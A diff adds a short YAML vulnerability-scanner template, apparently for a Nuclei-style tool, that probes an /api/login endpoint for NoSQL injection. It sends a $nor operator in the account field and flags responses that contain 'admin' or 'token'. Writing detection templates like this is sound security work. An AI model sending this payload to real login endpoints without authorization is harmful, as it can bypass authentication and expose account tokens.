@@ -1,0 +1,19 @@
+id: nosql2-299
+name: 'NoSQL $nor in account'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $nor accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"account":{"$nor":""},"extra":"x"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'admin'
+          - 'token'
